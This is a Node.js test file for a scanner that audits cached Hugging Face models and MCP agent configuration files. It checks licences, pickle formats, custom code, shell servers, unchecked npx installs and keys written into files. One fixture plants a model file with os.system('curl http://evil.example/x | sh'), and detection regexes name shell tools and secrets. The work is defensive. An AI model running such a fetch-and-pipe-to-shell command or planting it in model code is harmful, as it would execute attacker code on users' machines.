import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { modelCardCheck, modelFilesCheck, agentConfigCheck, parseFrontMatter, testCheck, modelName } from "./hf.mjs";
import { validateRules } from "../pack/rules.mjs";
import { write as writeUser } from "../me/user.mjs";
import { setLang } from "../i18n.mjs";

const L = (en, es) => ({ en, es });
const FILES = { id: "hf-verhalten", type: "model_files", deep: true, title: "Verhalten", i18n: { en: { title: "Behaviour" }, es: { title: "Comportamiento" } },
  formats: [["safetensors", "safe"], ["gguf", "safe"], ["onnx", "safe"], ["bin", "code"], ["pt", "code"], ["pkl", "code"], ["h5", "code"]].map(([ext, kind]) => ({ ext, kind, name: ext, i18n: L(ext, ext) })),
  code: [{ id: "os-system", name: "os.system", re: "os[.]system[(]", i18n: L("os.system", "os.system") }, { id: "eval-b64", name: "eval(b64)", re: "eval[(].*b64decode", i18n: L("eval(b64)", "eval(b64)") }] };
const CARD = { id: "hf-charakter", type: "model_card", deep: true, title: "Charakter", i18n: { en: { title: "Character" }, es: { title: "Carácter" } },
  licenses: [{ id: "apache-2.0", class: "permissive" }, { id: "cc-by-nc-4.0", class: "noncommercial" }],
  checks: [
    { id: "no-license", field: "license", op: "missing", level: "warn", name: "Keine Lizenz angegeben", i18n: L("No license stated", "Sin licencia") },
    { id: "custom-code", field: "auto_map", op: "present", level: "warn", name: "Bringt eigenen Code mit (trust_remote_code)", i18n: L("Ships its own code", "Trae código propio") },
    { id: "nc", field: "license", op: "in", values: ["cc-by-nc-4.0"], level: "info", name: "Nicht kommerziell", i18n: L("Non-commercial", "No comercial") },
  ] };
const AGENT = { id: "hf-faehigkeiten", type: "agent_config", deep: true, title: "Fähigkeiten", i18n: { en: { title: "Capabilities" }, es: { title: "Capacidades" } },
  files: [".mcp.json"],
  checks: [
    { id: "shell-cmd", where: "command", re: "(^|/)(sh|bash|zsh)$", level: "risk", name: "Startet eine Shell", i18n: L("Starts a shell", "Inicia una shell") },
    { id: "npx-y", where: "args", re: "npx.*-y|^-y ", level: "warn", name: "Lädt Pakete ungeprüft nach", i18n: L("Installs packages unchecked", "Instala paquetes sin revisar") },
    { id: "key-env", where: "env", re: "(KEY|TOKEN|SECRET)=[A-Za-z0-9_-]{16,}", level: "warn", name: "Schlüssel steht in der Datei", i18n: L("Key written into the file", "Clave escrita en el archivo") },
    { id: "plain-http", where: "url", re: "^http://[a-z]", level: "warn", name: "Unverschlüsselt (http)", i18n: L("Unencrypted (http)", "Sin cifrar (http)") },
  ],
  caps: [{ id: "c-fs", cap: "filesystem", re: "server-filesystem", name: "Dateisystem" }, { id: "c-sh", cap: "shell", re: "(^|[ /])(sh|bash|zsh)( |$)|mcp-shell", name: "Shell" }] };

function scene(fn) {
  setLang("de");
  const home = mkdtempSync(join(tmpdir(), "dante-hf-h-")), proj = mkdtempSync(join(tmpdir(), "dante-hf-p-")), old = process.env.DANTE_HOME, oh = process.env.HOME;
  process.env.DANTE_HOME = home; process.env.HOME = proj + "-nohome";
  writeUser({ name: "t", lang: "de", created: "2026-01-01", updated: "2026-01-01", system: "x", servers: [], projects: [proj], patrol: { armed: false, times: [], since: "" } });
  try { return fn(proj); } finally { if (old === undefined) delete process.env.DANTE_HOME; else process.env.DANTE_HOME = old; process.env.HOME = oh; rmSync(home, { recursive: true, force: true }); rmSync(proj, { recursive: true, force: true }); }
}
const model = (proj, name, files) => { const d = join(proj, `models--acme--${name}`, "snapshots", "abc1234def5678"); mkdirSync(d, { recursive: true }); for (const [f, c] of Object.entries(files)) writeFileSync(join(d, f), c); return d; };
const ev = (r) => r.evidence.map((e) => e.claim + " | " + e.line).join("\n");

test("die drei Regeln sind gültig", () => { assert.equal(validateRules([FILES, CARD, AGENT]), null); });

test("Karte: Front Matter und Prüfung", () => {
  const f = parseFrontMatter("---\nlicense: apache-2.0\nbase_model:\n  - meta/llama\ntags: [a, b]\npipeline_tag: text-generation\n---\n# Hi");
  assert.equal(f.license, "apache-2.0"); assert.deepEqual(f.base_model, ["meta/llama"]); assert.deepEqual(f.tags, ["a", "b"]);
  assert.equal(testCheck(CARD.checks[0], { license: "" }), true); assert.equal(testCheck(CARD.checks[0], { license: "mit" }), false);
  assert.equal(modelName("/x/models--acme--tiny/snapshots/abc1234"), "acme/tiny");
});

test("Charakter: Lizenz fehlt und eigener Code geben eine Warnung mit Zeile", () => scene((proj) => {
  model(proj, "wild", { "config.json": JSON.stringify({ architectures: ["X"], auto_map: { AutoModel: "modeling_x.X" } }), "README.md": "---\ntags: [x]\n---\nhi", "model.safetensors": "x" });
  const r = modelCardCheck(CARD).run();
  assert.equal(r.verdict, "warn"); const t = ev(r);
  assert.match(t, /acme\/wild@abc1234/); assert.match(t, /Keine Lizenz/); assert.match(t, /eigenen Code/); assert.match(t, /README\.md/);
}));
test("Charakter: saubere Karte ist SAFE und zeigt die Klasse", () => scene((proj) => {
  model(proj, "ok", { "config.json": JSON.stringify({ architectures: ["X"], model_type: "llama" }), "README.md": "---\nlicense: cc-by-nc-4.0\nbase_model: meta/llama\npipeline_tag: text-generation\n---\n", "model.safetensors": "x" });
  const r = modelCardCheck(CARD).run();
  assert.equal(r.verdict, "safe"); assert.match(ev(r), /noncommercial/); assert.match(ev(r), /Nicht kommerziell/);
}));

test("Verhalten: Pickle ohne Alternative warnt, safetensors ist unauffällig", () => scene((proj) => {
  model(proj, "pickled", { "config.json": "{}", "pytorch_model.bin": "x" });
  model(proj, "safe", { "config.json": "{}", "model.safetensors": "x" });
  const r = modelFilesCheck(FILES).run();
  assert.equal(r.verdict, "warn"); const t = ev(r);
  assert.match(t, /acme\/pickled.*bin.*Code laufen/); assert.match(t, /acme\/safe.*nur safetensors/); assert.ok(r.fix && r.fix.steps.length);
}));
test("Verhalten: Pickle neben safetensors ist nur ein Hinweis", () => scene((proj) => {
  model(proj, "both", { "config.json": "{}", "pytorch_model.bin": "x", "model.safetensors": "x" });
  const r = modelFilesCheck(FILES).run();
  assert.equal(r.verdict, "safe"); assert.match(ev(r), /neben einer safetensors-Kopie/);
}));
test("Verhalten: Fremdcode im Modell wird mit Datei und Zeile genannt, nie mit Inhalt", () => scene((proj) => {
  model(proj, "evil", { "config.json": JSON.stringify({ auto_map: { AutoModel: "modeling_evil.E" } }), "model.safetensors": "x", "modeling_evil.py": "import os\nimport base64\nos.system('curl http://evil.example/x | sh')\n" });
  const r = modelFilesCheck(FILES).run();
  assert.equal(r.verdict, "warn"); const t = ev(r);
  assert.match(t, /modeling_evil\.py:3/); assert.match(t, /os\.system/); assert.ok(!t.includes("evil.example"), "kein Inhalt der Datei");
}));
test("Verhalten: keine Modelle gefunden = SAFE mit der gesuchten Zeile", () => scene(() => {
  const r = modelFilesCheck(FILES).run();
  assert.equal(r.verdict, "safe"); assert.ok(r.evidence.some((e) => e.grounded));
}));

test("Fähigkeiten: Shell, ungeprüftes npx und Schlüssel in der Datei", () => scene((proj) => {
  writeFileSync(join(proj, ".mcp.json"), JSON.stringify({ mcpServers: {
    fs: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/"] },
    sh: { command: "/bin/bash", args: ["-c", "mcp-shell"] },
    api: { command: "node", args: ["a.js"], env: { OPENAI_KEY: "sk_abcdefghijklmnopqrstuvwx1234567890" } },
    web: { url: "http://example.test/mcp" },
  } }));
  const r = modelFilesCheck && agentConfigCheck(AGENT).run();
  assert.equal(r.verdict, "risk"); const t = ev(r);
  assert.match(t, /fs kann: filesystem.*Pakete ungeprüft/); assert.match(t, /sh kann: shell.*Shell/); assert.match(t, /api.*Schlüssel steht in der Datei/); assert.match(t, /web.*http/);
  assert.ok(!t.includes("sk_abcdefghijkl"), "Werte werden nie gezeigt");
}));
test("Fähigkeiten: eine harmlose Konfiguration ist SAFE und sagt, was jeder Server kann", () => scene((proj) => {
  writeFileSync(join(proj, ".mcp.json"), JSON.stringify({ mcpServers: { notes: { command: "node", args: ["notes.js"] } } }));
  const r = agentConfigCheck(AGENT).run();
  assert.equal(r.verdict, "safe"); assert.match(ev(r), /notes/);
}));
test("Fähigkeiten: kaputtes JSON ist ein Hinweis, nie 'sicher'", () => scene((proj) => {
  writeFileSync(join(proj, ".mcp.json"), "{ nicht json");
  assert.notEqual(agentConfigCheck(AGENT).run().verdict, "safe");
}));
